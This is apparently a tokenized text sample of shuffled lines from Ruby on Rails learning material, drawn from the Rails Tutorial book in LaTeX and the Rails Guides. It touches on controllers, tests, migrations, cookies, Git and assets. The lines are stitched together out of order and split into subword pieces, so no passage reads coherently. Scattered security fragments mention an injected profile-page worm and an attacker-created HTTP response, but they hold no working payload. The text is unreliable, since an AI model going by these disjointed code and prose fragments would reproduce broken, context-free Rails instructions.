▁E x a m in ing ▁Listing ~\ ref { code : toy _ application _ controller _ class }, ▁we ▁see ▁that ▁\ k ode { Application Controller } ▁itself ▁inherit s ▁from ▁\ k ode { ActionController :: Base } ; ▁this ▁is ▁the ▁base ▁class ▁for ▁controllers ▁provided ▁by ▁the ▁Rails ▁library ▁Action ▁Pack .
▁m o un t ▁Blorgh :: Engine , ▁at : ▁"/ blog "
▁Rails ▁comes ▁with ▁three ▁standard ▁ environments : ▁\ k ode { development }, ▁\ k ode { test }, ▁and ▁\ k ode { production } .
▁ Integration ▁tests ▁can ▁verify ▁correct ▁routes , ▁database ▁update s , ▁and ▁proper ▁changes ▁to ▁the ▁layout .
▁Because ▁of ▁the ▁\ k ode { ▖ rdoc } ▁extension ▁on ▁the ▁file , ▁GitHub ▁ensure s ▁that ▁it ▁is ▁ formatted ▁nicely , ▁but ▁the ▁contents ▁are n ' t ▁helpful ▁at ▁all , ▁so ▁in ▁this ▁section ▁we ' ll ▁make ▁our ▁first ▁edit ▁by ▁changing ▁the ▁\ k ode { README } ▁to ▁describe ▁our ▁project ▁rather ▁than ▁the ▁Rails ▁framework ▁itself .
▁login _ procedure ▖ call ( token , ▁options )
▁Then ▁we ' ll ▁check ▁for ▁a ▁nonempty ▁flash ▁message ▁and ▁a ▁successful ▁redirect ▁to ▁the ▁profile ▁page , ▁while ▁also ▁verify ing ▁that ▁the ▁user ' s ▁information ▁correctly ▁changed ▁in ▁the ▁database .
▁Consider ▁these ▁actions ▁to ▁see ▁the ▁difference :
▁Re s ul ting ▁HTML ▁files ▁can ▁be ▁found ▁in ▁the ▁ ▖ / doc / rdoc ▁directory .
▁Fin ally , ▁as ▁with ▁users , ▁we ' ll ▁make ▁it ▁possible ▁to ▁destroy ▁microposts ▁through ▁the ▁web .
▁> > ▁x ▁* = ▁3
▁Tests ▁a c t ▁as ▁a ▁\ emph { client } ▁for ▁the ▁application ▁code , ▁there by ▁help ing ▁determine ▁its ▁design ▁and ▁its ▁interface ▁with ▁other ▁parts ▁of ▁the ▁system .
▁P la ce ▁the ▁token ▁in ▁the ▁browser ▁cookies ▁with ▁an ▁ expiration ▁date ▁far ▁in ▁the ▁future .
▁To ▁test ▁the ▁micropost ▁display ▁on ▁the ▁profile , ▁we ▁need ▁to ▁associate ▁the ▁fixture ▁microposts ▁with ▁a ▁user .
▁In ▁the ▁end , ▁he ▁ got ▁a ▁4 ▁ K B ▁worm , ▁which ▁he ▁ inject ed ▁into ▁his ▁profile ▁page .
▁For ▁example , ▁we ▁could ▁implement ▁user ▁signin ▁by ▁ placing ▁a ▁cookie ▁with ▁value ▁equal ▁to ▁the ▁remember ▁token ▁that ▁ expire s ▁20 ~ years ▁from ▁now :
▁Because ▁we ▁want ▁the ▁user ▁id ▁to ▁be ▁pair ed ▁with ▁the ▁ permanent ▁remember ▁token , ▁we ▁should ▁make ▁it ▁ permanent ▁as ▁well , ▁which ▁we ▁can ▁do ▁by ▁ chain ing ▁the ▁\ k ode { signed } ▁and ▁\ k ode { permanent } ▁methods :
▁What ▁follows ▁build s ▁on ▁the ▁work ▁from ▁Section ~\ ref { sec : microposts _ resource } ; ▁as ▁with ▁the ▁model ▁in ▁that ▁section , ▁our ▁new ▁Micropost ▁model ▁will ▁include ▁data ▁validations ▁and ▁an ▁association ▁with ▁the ▁User ▁model .
▁attributes ▁= ▁{})
▁Active ▁Record ▁does ▁not ▁accept ▁ unknown ▁options ▁when ▁build ing ▁associations , ▁for ▁example ▖
▁Client ▖ limit ( 5 )
▁There ▁isn ' t ▁much ▁to ▁this ▁file ▁- ▁but ▁note ▁that ▁the ▁` Article ` ▁class ▁inherit s ▁from ╼` ActiveRecord :: Base ` ▖
▁#### # ▁` prev _ quarter `, ▁` next _ quarter `
▁< script ▁src =" http :// html 5 shim ▖ google code ▖ com / svn / t run k / html 5 ▖ js "></ script >
▁* ▁` config ▖ active _ record ▖ cache _ timestamp _ format ` ▁control s ▁the ▁format ▁of ▁the ▁timestamp ▁value ▁in ▁the ▁cache ▁key ▖
▁ Third - part y ▁assets ▁such ▁as ▁c ascad ing ▁style ▁ sheet s ▁( CSS ), ▁JavaScript ▁files , ▁and ▁images
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁take s ▁an ▁in te gr at ed ▁approach ▁to ▁web ▁development ▁by ▁build ing ▁three ▁example ▁applications ▁of ▁increasing ▁ sophistication , ▁starting ▁with ▁a ▁minimal ▁\ emph { hello } ▁app ▁( Section ~\ ref { sec : the _ hello _ application }), ▁a ▁slightly ▁more ▁cap able ▁\ emph { toy } ▁app ▁( Chapter ~\ ref { cha : a _ toy _ app }), ▁and ▁a ▁real ▁\ emph { sample } ▁app ▁( Chapter ~\ ref { cha : static _ pages } ▁through ▁Chapter ~\ ref { cha : following _ users }) .
▁m attr _ accessor ▁: constant _ watch _ stack
▁TIP : ▁Rendering ▁p ure ▁text ▁is ▁most ▁useful ▁when ▁you ' re ▁respond ing ▁to ▁Ajax ▁or ▁web ╼ service ▁requests ▁that ▁are ▁expect ing ▁something ▁other ▁than ▁proper ▁HTML .
▁If ▁order ▁matter s , ▁use ▁an ▁array .
▁A part ▁from ▁the ▁address ▁of ▁the ▁Heroku ▁app , ▁the ▁result ▁should ▁be ▁the ▁same ▁as ▁in ▁Figure ~\ ref { fig : heroku _ app } .
▁#### ▁S q u a sh ing ▁commit s
▁The ▁users ▁index ▁page ▁with ▁100 ▁sample ▁users .
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title ▖
▁ From ▁the ▁application ▁root , ▁run ▁the ▁model ▁generator ▖
▁This ▁is ▁the ▁text ▁that ▁will ▁be ▁returned ▁to ▁the ▁browser .
▁in ▁Listing ~\ ref { code : user _ model _ activation _ code } ▁and
▁Here ▁the ▁string ▁\ k ode { 9 3 08 b 8 f 92 fe a 4 c 19 a 3 a 0 d 8 38 5 b 4 9 45 2 6 } ▁( which ▁will ▁differ ▁on ▁your ▁system ) ▁is ▁added ▁by ▁Rails ▁to ▁ensure ▁that ▁the ▁filename ▁is ▁unique , ▁which ▁cause s ▁browsers ▁to ▁load ▁images ▁properly ▁when ▁they ▁have ▁been ▁updated ▁( instead ▁of ▁re t ri e v ing ▁them ▁from ▁the ▁browser ▁cache ) .
▁#### ▁stylesheet _ path
▁ ActionView :: Base ▖ sanitize d _ allow ed _ tags ▖ delete ▁' div '
▁ s ▖ add _ development _ dependency ▁" m oo "
▁has _ one ▁: account , ▁foreign _ key : ▁" s up p _ id "
▁So ▁depending ▁on ▁your ▁current ▁request ▁load , ▁you ▁could ▁very ▁well ▁have ▁multiple ▁thread s ▁con t end ing ▁for ▁a ▁ limited ▁amount ▁of ▁connection s .
▁| ▁| ▁ 302 ▁| ▁: f ound ▁|
▁Now ▁that ▁our ▁sample ▁users ▁have ▁both ▁followed ▁users ▁and ▁followers , ▁we ▁need ▁to ▁update ▁the ▁profile ▁page ▁and ▁Home ▁page ▁to ▁reflect ▁this .
▁rake ▁db : migrate ▁S C O P E = blorgh ▁ VERSION = 0
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁\ k ode { String } ▁class .
▁File ETag ▁N one
▁belongs _ to ▁: customer , ▁-> ▁ { ▁where ▁active : ▁true ▁ },
▁* ▁P ref er ▁` method ▁ { ▁do _ stuff ▁}` ▁instead ▁of ▁` method { do _ stuff } ` ▁for ▁single - line ▁blocks .
▁S ub m it ting ▁the ▁\ href { http :// localhost :3000/ sessions / new }{/ sessions / new } ▁form ▁then ▁yields ▁the ▁result ▁show n ▁in ▁Figure ~\ ref { fig : initial _ failed _ login _ rails _3} .
▁Scopes ▁are ▁also ▁ chain able ▁within ▁scope s :
▁When ▁you ▁try ▁to ▁save ▁your ▁object , ▁` valid ?` ╼ will ▁be ▁called ▁upon ▁each ▁one ▁of ▁the ▁ associated ▁objects .
▁ Validations ▁are ▁covered ▁in ▁detail ▁in ▁[ Active ╼ Record ▁ Validations ]( active _ record _ validations ▖ html )
▁@ person ▖ errors [: base ] ▁<< ▁" This ▁person ▁is ▁ evi l "
▁$ ▁< edit or ▁name > ▁ .
▁Author ▖ where ( name : ▁' H an k ▁M ood y ')▖ compact !
▁format ▖ json ▁ { ▁render ▁ json : ▁@ user ▖ errors , ▁status : ▁: un process able _ entity ▁ }
▁A ▁working ▁signup ▁page ▁on ▁the ▁live ▁Web ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ in _ production _ bootstrap - full ▖ png }{( full ▁size )}
▁# ▁Generate s ▁a ▁ datetime ▁select ▁that ▁defaults ▁to ▁the ▁ datetime ▁provided ▁( f our ▁day s ▁after ▁ today )
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁an ▁ Embedded ▁Ruby ▁title .
▁The ▁method ▁` prev _ week ` ▁is ▁analogous :
▁assemblies << ( object , ▁ ▖▖▖)
▁For ▁example , ▁if ▁a ▁ supplier ▁has ▁an ▁account , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁account s ▁is ▁` Billing `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁images ▁ javascripts ▁stylesheets
▁` params [: id ]` ▁will ▁be ▁` "1" `, ▁and ▁` params [: user _ id ]` ▁will ▁be ▁` " 2 " ` .
▁For ▁a ▁convenient ▁way ▁to ▁ visual ize ▁Git ▁repositories , ▁take ▁a ▁look ▁at ▁\ href { http :// www ▖ source tree app ▖ com /}{ A t la s s i an ' s ▁S our ce T re e ▁app } .
▁article ▁GET ▁ / articles / : id (▖ : format ) ▁articles # show
▁Over ▁the ▁ years , ▁h un d r ed s ▁of ▁people ▁have ▁contribute d ▁to ▁Ruby ▁on ▁Rails ▁ r an g ing ▁from ▁a ▁single ▁character ▁to ▁ mass ive ▁ ar ch ite c t ur al ▁changes ▁or ▁significant ▁documentation ▁- ▁all ▁with ▁the ▁goal ▁of ▁making ▁Ruby ▁on ▁Rails ▁better ▁for ▁every one ▖
▁On ce ▁you ▁see ▁the ▁general ▁ s ha pe ▁of ▁the ▁solution , ▁you ▁can ▁then ▁use ▁ TDD ▁to ▁implement ▁a ▁more ▁polish ed ▁version .
▁A ▁boolean ▁attribute ▁\ k ode { admin } ▁on ▁users ▁automatically ▁gives ▁a ▁\ k ode { user ▖ admin ?}\ ▁boolean ▁method .
▁Active ▁Support ▁ Core ▁Extensions
▁# ▁< s ha 1> 723 a 4 7 b f b 37 08 f 9 6 88 2 1 b c 9 6 9 a 9 a 3 f c 87 3 a 3 ed 58 </ s ha 1>
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : password _ resets _ integration _ test }, ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁You ▁can ▁verify ▁this ▁yourself ▁by ▁running ▁the ▁test ▁suite , ▁which ▁should ▁pass :
▁As ▁a ▁first ▁step ▁in ▁this ▁process , ▁this ▁section ▁contains ▁some ▁suggest ion s ▁for ▁further ▁learning .
▁Recall ing ▁that ▁\ k ode { authenticate } ▁returns ▁\ k ode { false } ▁for ▁an ▁invalid ▁authentication , ▁our ▁strategy ▁for ▁user ▁signin ▁can ▁be ▁summariz ed ▁as ▁follows :
▁in ▁the ▁arguments ▁to ▁\ k ode { form \_ for }, ▁which ▁is ▁necessary ▁for ▁file ▁upload s .
▁This ▁will ▁occur ▁natural ly ▁in ▁an ▁integration ▁test ▁( Listing ~\ ref { code : password _ reset _ integration _ test }), ▁but ▁in ▁the ▁present ▁context ▁we ▁need ▁to ▁create ▁one ▁by ▁hand .
▁<%= ▁f ▖ submit ▁%>
▁We ' ll ▁learn ▁how ▁to ▁model ▁such ▁user ▁relationships , ▁and ▁see ▁the ▁implications ▁for ▁the ▁microposts ▁feed , ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁A ▁user ▁with ▁updated ▁information ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ update _ user _ rails _ 3- full ▖ png }{( full ▁size )}
▁To ▁get ▁the ▁follow ▁and ▁ unfollow ▁button s ▁to ▁work , ▁all ▁we ▁need ▁to ▁do ▁is ▁find ▁the ▁user ▁ associated ▁with ▁the ▁\ k ode { followed \_ id } ▁in ▁the ▁corresponding ▁form ▁( i ▖ e ▖ , ▁Listing ~\ ref { code : follow _ form } ▁or ▁Listing ~\ ref { code : unfollow _ form }), ▁and ▁then ▁use ▁the ▁appropriate ▁\ k ode { follow } ▁or ▁\ k ode { unfollow } ▁method ▁from ▁Listing ~\ ref { code : follow _ unfollow _ following } .
▁In ▁the ▁following ▁example , ▁` find _ each ` ▁will ▁retrieve ▁1 000 ▁records ▁( the ▁current ▁default ▁for ▁both ▁` find _ each ` ▁and ▁` find _ in _ batches ` ) ▁and ▁then ▁yield ▁each ▁record ▁individual ly ▁to ▁the ▁block ▁as ▁a ▁model ▖
▁$ ▁ curl ▁- i ▁1 27 ▖ 0 ▖ 0 ▖ 1 :3000/ books
▁redirect _ to ▁action : ▁: index
▁To ▁get ▁a ▁better ▁ picture ▁of ▁how ▁Rails ▁handle s ▁the ▁submission , ▁let ' s ▁take ▁a ▁close r ▁look ▁at ▁the ▁\ k ode { user } ▁part ▁of ▁the ▁parameters ▁hash ▁from ▁the ▁debug ▁information ▁( Figure ~\ ref { fig : signup _ failure _ rails _ debug }) :
▁if ▁ expiration _ date ▖ present ?
▁params ▖ require (: comment )▖ permit (: text )
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ edit _ spec s }
▁The ▁\ k ode { User } ▁class , ▁highlight ing ▁inheritance .
▁and ▁omit ▁the ▁leading ▁\ k ode { bundle ▁exec } .
▁In ▁Rails ▁version ▁ 3▖0 ▁and ▁earlier , ▁static ▁assets ▁live d ▁in ▁the ▁\ k ode { public / } ▁directory , ▁as ▁follows :
▁### ▁ Show ing ▁Article s
▁ / t mp
▁### ▁R each able
▁#### ▁` instance _ value s `
▁This ▁JavaScript ▁code ▁will ▁simply ▁display ▁an ▁ alert ▁ box ▖
▁This ▁is ▁exactly ▁the ▁sort ▁of ▁feature ▁that ▁could ▁easily ▁lead ▁to ▁a ▁ s p ur i ous ▁passing ▁test ▁( i ▖ e ▖ , ▁a ▁test ▁that ▁would ▁pass ▁even ▁if ▁the ▁application ▁code ▁were ▁wrong ), ▁so ▁we ' ll ▁proceed ▁using ▁test - driven ▁development ▁to ▁be ▁sure ▁we ' re ▁testing ▁the ▁right ▁thing .
▁For ▁example , ▁if ▁each ▁ supplier ▁in ▁your ▁application ▁has ▁only ▁one ▁account , ▁you ' d ▁declare ▁the ▁ supplier ▁model ▁like ▁this :
▁Listing ~\ ref { code : generate _ user _ model } ▁also ▁created ▁the ▁model ▁itself .
▁U nfortunately , ▁this ▁doesn ' t ▁work , ▁due ▁to ▁a ▁subtlety ▁about ▁Ruby ▁arrays .
▁ Test ▁for ▁signin ▁ success .
▁duplicate ▁# ▁=> ▁[ ' foo ']
▁in ▁Listing ~\ ref { code : preventing _ unactivated _ login s } .
▁After ▁in v o k ing ▁the ▁model , ▁the ▁controller ▁then ▁render s ▁the ▁view ▁and ▁returns ▁the ▁complete ▁web ▁page ▁to ▁the ▁browser ▁as ▁HTML .
▁ n ▁addition ▁to
▁<%= ▁stylesheet _ link _ tag ▁" main ", ▁" photos / columns " ▁%>
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁add ▁- A ╼ $ ▁git ▁commit ▁- m ▁" A d d ▁password ▁resets ▁& ▁email ▁configuration " ╼ $ ▁git ▁ checkout ▁master ╼ $ ▁git ▁merge ▁account - activation - password - reset
▁WARNING ▖ ▁Note ▁that ▁` reverse _ update ` ▁has ▁no ▁ bang .
▁Tests ▁for ▁creating ▁microposts .
▁The ▁way ▁to ▁learn ▁how ▁to ▁do ▁something ▁like ▁this ▁is ▁by ▁\ href { http :// l m gt fy ▖ com / ? q = ruby + rails + escape + url } { Go o g l ing ▁`` ruby ▁rails ▁escape ▁url '' } .
▁* ▁Rails ▁4▖0 ▁has ▁changed ▁how ▁errors ▁a tt a ch ▁with ▁the ▁` ActiveModel :: Validations :: C on fi rm ation Validator ` ▖
▁To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password \_ reset \_ expired ?}
▁Now ▁that ▁we ▁have ▁a ▁working ▁User ▁model , ▁it ' s ▁time ▁to ▁add ▁an ▁ability ▁few ▁website s ▁can ▁live ▁without : ▁let ting ▁users ▁sign ▁up ▁for ▁the ▁site .
▁ Form ▁helpers ▁are ▁design ed ▁to ▁make ▁working ▁with ▁models ▁much ▁easier ▁compar ed ▁to ▁using ▁just ▁standard ▁HTML ▁elements ▁by ▁providing ▁a ▁set ▁of ▁methods ▁for ▁creating ▁forms ▁base d ▁on ▁your ▁models ▖
▁config ▖ session _ store ▁: my _ custom _ store
▁ Sign ed - in ▁users ▁have ▁no ▁reason ▁to ▁access ▁the ▁\ k ode { new } ▁and ▁\ k ode { create } ▁actions ▁in ▁the ▁Users ▁controller .
▁In ▁particular , ▁the ▁master ▁branch ▁is ▁in s ul at ed ▁from ▁any ▁changes ▁we ▁make ▁to ▁the ▁topic ▁branch , ▁so ▁even ▁if ▁we ▁\ emph { re ally } ▁ s c re w ▁things ▁up ▁we ▁can ▁always ▁a b and on ▁the ▁changes ▁by ▁check ing ▁out ▁the ▁master ▁branch ▁and ▁ deleting ▁the ▁topic ▁branch .
▁This ▁will ▁render ▁a ▁file ▁named ▁` _ menu ▖ html ▖ erb ` ▁at ▁that ▁point ▁within ▁the ▁view ▁being ▁rendered ▖
▁You ▁can ▁also ▁push ▁up ▁to ▁GitHub :
▁validates ▁: registration _ number , ▁length : ▁ { ▁is : ▁6 ▁ }
▁` NOT ` ▁SQL ▁queries ▁can ▁be ▁built ▁by ▁` where ▖ not ` .
▁We ' ve ▁\ emph { al most } ▁achieve d ▁that ▁with ▁our ▁current ▁layout , ▁with ▁one ▁ w r in k le : ▁as ▁you ▁can ▁see ▁if ▁you ▁delete ▁the ▁\ k ode { provide } ▁call ▁in ▁one ▁of ▁the ▁views , ▁in ▁the ▁absence ▁of ▁a ▁page - specific ▁title ▁the ▁full ▁title ▁appears ▁as ▁follows :
▁This ▁file ▁path ▁should ▁be ▁under st ood ▁as ▁being ▁relative ▁to ▁the ▁application ' s ▁root ▁directory , ▁which ▁will ▁var y ▁by ▁system ; ▁on ▁the ▁cloud ▁IDE ▁( Section ~\ ref { sec : development _ environment }), ▁it ▁look s ▁like ▁this :
▁Check ing ▁the ▁file ▁size ▁with ▁ jQuery .
▁< input ▁name =" commit " ▁type =" submit " ▁value =" Create " ▁/>
▁* ▁How ▁to ▁work ▁with ▁the ▁error ▁messages ▁generated ▁by ▁the ▁validation ▁process .
▁Because ▁the ▁only ▁gems ▁we ' ve ▁added ▁are ▁restrict ed ▁to ▁a ▁production ▁environment , ▁right ▁now ▁this ▁command ▁doesn ' t ▁actually ▁install ▁any ▁ additional ▁local ▁gems , ▁but ▁it ' s ▁needed ▁to ▁update ▁\ k ode { Gemfile ▖ lock } ▁with ▁the ▁\ text tt { pg } ▁and ▁\ text tt { rails \_ 12 factor } ▁gems ▁and ▁the ▁specific ▁Ruby ▁version .
▁render ▁status : ▁50 0
▁ Base d ▁on ▁reader ▁feedback , ▁I ' m ▁confident ▁that ▁you ▁can ▁ still ▁get ▁a ▁lot ▁out ▁of ▁this ▁book .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / strip ▖ rb ` .
▁< h 1> Welcome ▁to ▁example ▖ com , ▁<%= ▁@ user ▖ name ▁%></ h 1>
▁( M any ▁programmer s ▁rely ▁on ▁online ▁documentation ▁instead ▁of ▁the ▁native ▁ ri ▁and ▁ rdoc ▁document s ▖)
▁config ▖ action _ mailer ▖ default _ options ▁= ▁ { from : ▁' no - reply @ example ▖ com ' }
▁In ▁the ▁present ▁instance , ▁we ▁want ▁to ▁require ▁the ▁\ k ode { params } ▁hash ▁to ▁have ▁a ▁\ k ode { : user } ▁attribute , ▁and ▁we ▁want ▁to ▁ permit ▁the ▁name , ▁email , ▁password , ▁and ▁password ▁confirmation ▁attributes ▁( but ▁no ▁other s ) .
▁Active ▁Record ▁validations ▁allow ▁us ▁to ▁place ▁constraints ▁on ▁the ▁data ▁in ▁our ▁models .
▁You ▁should ▁not ▁rely ▁on ▁any ▁particular ╼ order ▁a mong ▁those ▖
▁=> ▁Rails ▁application ▁starting ▁on ▁ http :// 0 ▖ 0 ▖ 0 ▖ 0 : 3 000
▁The ▁first ▁Rails ▁Tutorial ▁application ▁running ▁on ▁Heroku .
▁Then ▁run ▁these :
▁< div >< input ▁type =" submit " ▁value =" A n ▁article "></ div >
▁* ▁` load _ environment _ hook ` ▁S er ve s ▁as ▁a ▁place h ol d er ▁so ▁that ▁`: load _ environment _ config ` ▁can ▁be ▁defined ▁to ▁run ▁before ▁it .
▁T e mp or ar ily ▁comment ing ▁out ▁failing ▁tests ▖
▁Defaults ▁to ▁` false ` ▁and ▁will ▁use ▁ Test :: Uni t ▁by ▁default .
▁This ▁guide ▁provides ▁you ▁with ▁all ▁you ▁need ▁to ▁get ▁started ▁in ▁creating ,╼ enqueue ing ▁and ▁execut ing ▁background ▁job s .
▁g ▁the ▁text ▁`` The ▁form ▁contains ▁4 ▁errors ▖ '' ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - fa a 5 fa ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁testing _ unsuccessful _ edit s ▁( end )╼╼ ▁\ subsection { S u cc ess ful ▁edit s ▁( with ▁ TDD )} ▁% ▁( fold )╼ ▁\ label { sec : successful _ edit s }╼╼
▁It ▁work ed !
▁But ▁be ▁ w ar n ed : ▁they ▁accomplish ▁their ▁a ma z ing ▁f if te en - minute ▁ fe at ▁using ▁a ▁feature ▁called ▁\ emph { scaffold ing }, ▁which ▁relie s ▁heav ily ▁on ▁\ emph { generated ▁code }, ▁magic ally ▁created ▁by ▁the ▁Rails ▁\ k ode { generate } ▁command .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : route _ tests }
▁* ▁` config ▖ middleware ` ▁allows ▁you ▁to ▁configure ▁the ▁application ' s ▁middleware ▖
▁<% ▁cache ▁do ▁%>
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / in tr o spec tion ▖ rb ` .
▁* ▁Method ▁names .
▁is ▁always ▁\ k ode { nil } .
▁* ▁` application _ controller ▖ rb `
▁make _ microposts
▁ Refactor ing ▁the ▁code ▁as ▁above ▁is ▁in c r ed i b ly ▁more ▁error - prone ▁without ▁a ▁so li d ▁test ▁suite , ▁which ▁is ▁why ▁we ▁we nt ▁to ▁such ▁trouble ▁to ▁write ▁good ▁tests ▁in ▁Section ~\ ref { sec : login _ with _ remember ing } ▁and ▁Section ~\ ref { sec : remember _ tests } .
▁get ▁' / ' ▁=> ▁' root # index '
▁╼╼ %= ▁ lang : r html ╼\ begin { code }
▁S ince ▁we ▁have ▁already ▁done ▁one ▁push ▁( Section ~\ ref { sec : github }), ▁on ▁most ▁systems ▁we ▁can ▁omit ▁\ k ode { origin ▁master }, ▁and ▁simply ▁run ▁\ k ode { git ▁push } :
▁* ▁Model ▁ Class ▁- ▁S ing ul ar ▁with ▁the ▁first ▁letter ▁of ▁each ▁word ▁ capitalize d ▁( e ▖ g ▖ , ╼` Book Cl ub ` ) .
▁In ▁this ▁case , ▁though , ▁the ▁\ k ode { xhr } ▁method ▁is ▁( some what ▁in ex p li c ably ) ▁not ▁available ▁in ▁integration ▁tests .
▁\ emph { Note } : ▁If ▁you ▁would ▁like ▁to ▁install ▁\ emph { all } ▁the ▁gems ▁needed ▁for ▁the ▁sample ▁application , ▁you ▁should ▁use ▁the ▁code ▁in ▁Listing ~\ ref { code : final _ gemfile } ▁at ▁this ▁time .
▁Ke y s ▁are ▁strings :
▁config ▖ active _ job ▖ queue _ name _ prefix ▁= ▁Rails ▖ env
▁< tr >
▁( T a k e ▁care ▁\ emph { not } ▁to ▁ initialize ▁the ▁repository ▁with ▁a ▁\ k ode { README } ▁file , ▁as ▁\ k ode { rails ▁new } ▁creates ▁one ▁of ▁those ▁automatically ▖)
▁You ▁can ▁also ▁use ▁the ╼` require _ directory ` ▁ directive ▁which ▁includes ▁all ▁JavaScript ▁files ▁only ▁in ▁the ╼ directory ▁specified , ▁without ▁re c ur s ion .
▁ ╼ ▁> > ▁Rails ▖ env
▁HTTP /1▖1 ▁200 ▁OK ▁[ Second ▁ New ▁response ▁created ▁by ▁attacker ▁ begin s ]
▁If ▁you ▁want ▁to ▁render ▁the ▁view ▁that ▁correspond s ▁to ▁a ▁different ▁template ▁within ▁the ▁same ▁controller , ▁you ▁can ▁use ▁` render ` ▁with ▁the ▁name ▁of ▁the ▁view :
▁The ▁ability ▁to ▁gra b ▁and ▁automatically ▁assign ▁all ╼ controller ▁parameters ▁to ▁your ▁model ▁in ▁one ▁ sh o t ▁make s ▁the ▁programmer ' s ▁job ╼ ea s i er , ▁but ▁this ▁convenience ▁also ▁allows ▁ malicious ▁use ▖
▁Because ▁of ▁the ▁flash ▁message ▁display ▁in ▁the ▁site ▁layout ▁( Listing ~\ ref { code : layout _ flash }), ▁the ▁\ k ode { flash [: danger ]} ▁message ▁automatically ▁get s ▁displayed ; ▁because ▁of ▁the ▁Bootstrap ▁CSS , ▁it ▁automatically ▁get s ▁nice ▁styling ▁( Figure ~\ ref { fig : failed _ signin _ flash }) .
▁The ▁following ▁methods ▁skip ▁validations , ▁and ▁will ▁save ▁the ▁object ▁to ▁the ╼ database ▁regardless ▁of ▁its ▁ validity ▖
▁ Scaffold ing : ▁ Q u ic k er , ▁easier , ▁more ▁ s ed u c tive
▁A ▁cookie ▁consist s ▁of ▁two ▁pieces ▁of ▁information , ▁a ▁\ k ode { value } ▁and ▁an ▁optional ▁\ k ode { expire s } ▁date .
▁F u ll ▁paths ▁from ▁the ▁document ▁root ▁will ▁be ▁passed ▁through ▖
▁The ▁place ment ▁of ▁the ▁text ▁isn ' t ▁good ▁and ▁the ▁ logo ▁doesn ' t ▁have ▁any ▁style , ▁but ▁the ▁ color s ▁and ▁signup ▁button ▁look ▁pro mis ing .
▁ mime _ version : ▁" 1 ▖ 0 ",
▁To ▁include ▁multiple ▁files ▁such ▁as ▁` app / assets / javascripts / main ▖ js ` ▁and ▁` app / assets / javascripts / columns ▖ js ` ▁at ▁the ▁same ▁time :
▁ Adding ▁a ▁ Second ▁Model
▁create ▁db / migrate / [ timestamp ] _ create _ users ▖ rb
▁#### ▁De let ing ▁a ▁ Middleware
▁The ▁method ▁is ▁to ▁make ▁three ▁ factory ▁users ▁( signing ▁in ▁as ▁the ▁first ▁one ) ▁and ▁then ▁verify ▁that ▁the ▁index ▁page ▁has ▁a ▁list ▁element ▁(\ k ode { li }) ▁tag ▁for ▁the ▁name ▁of ▁each ▁one .
▁get ▁' ex it ', ▁to : ▁' sessions # destroy ', ▁as : ▁: logout
▁In ▁this ▁case , ▁the ▁final ▁fixture ▁in ▁the ▁file ▁is ▁created ▁last ▁( and ▁hence ▁is ▁most ▁ recent ), ▁but ▁it ▁would ▁be ▁ foo li sh ▁to ▁rely ▁on ▁this ▁behavior , ▁which ▁is ▁brittle ▁and ▁ probably ▁system - dependent .
▁In ▁Listing ~\ ref { code : example _ user }, ▁we ▁did ▁this ▁with ▁Ruby ' s ▁\ k ode { attr \_ accessor } ▁method :
▁You ▁can ▁think ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁as ▁a ▁ video ▁g a me ▁where ▁you ▁are ▁the ▁main ▁character , ▁and ▁where ▁you ▁level ▁up ▁as ▁a ▁Rails ▁developer ▁in ▁each ▁chapter .
▁As ▁noted ▁in ▁Section ~\ ref { sec : format _ validation }, ▁the ▁email ▁ regex ▁in ▁Listing ~\ ref { code : validates _ format _ of _ email } ▁allows ▁invalid ▁email ▁addresses ▁with ▁con sec u tive ▁do t s ▁in ▁the ▁domain ▁name , ▁i ▖ e ▖ , ▁addresses ▁of ▁the ▁form ▁\ emph { foo @ bar ▖ ▖ com } .
▁Git ▁is ▁a ▁large ▁subject , ▁and ▁we ' ll ▁only ▁be ▁scratch ing ▁the ▁ s ur fa ce ▁in ▁this ▁book , ▁but ▁there ▁are ▁many ▁good ▁free ▁resources ▁online ; ▁I ▁es pecially ▁recommend ▁\ href { https :// co nfluence ▖ at la s s i an ▖ com / display / B IT B U C K E T / Cl one + your + Git + repository + and + add + source + file s } { Bitbucket ▁10 1 } ▁for ▁a ▁short ▁ overview ▁and ▁\ href { http :// git - s cm ▖ com / book }{\ emph { Pro ▁Git } } ▁by ▁S co tt ▁C ha con ▁for ▁a ▁book - length ▁introduction .
▁" hello "▖ from (0) ▁# ▁=> ▁" hello "
▁#### ▁` parameterize `
▁We ' ll ▁start ▁with ▁some ▁short ▁tests .
▁Of ▁course , ▁we ▁could ▁just ▁edit ▁the ▁migration ▁file ▁for ▁the ▁\ k ode { users } ▁table ▁in ▁Listing ~\ ref { code : users _ migration }, ▁but ▁that ▁would ▁require ▁roll ing ▁back ▁and ▁then ▁migrat ing ▁back ▁up .
▁If ▁`@ book ▖ special ?` ▁evaluate s ▁to ▁` true `, ▁Rails ▁will ▁start ▁the ▁rendering ▁process ▁to ▁ dump ▁the ▁`@ book ` ▁variable ▁into ▁the ▁` special _ show ` ▁view ▖
▁If ▁you ' ve ▁ never ▁used ▁version ▁control ▁before , ▁it ▁may ▁not ▁be ▁entire ly ▁clear ▁at ▁this ▁point ▁what ▁good ▁it ▁does ▁you , ▁so ▁let ▁me ▁give ▁just ▁one ▁example .
▁# ▁If ▁you ▁prefer ▁to ▁use ▁m o cha , ▁f le x mock ▁or ▁R R , ▁un comment ▁the ▁appropriate ▁line :
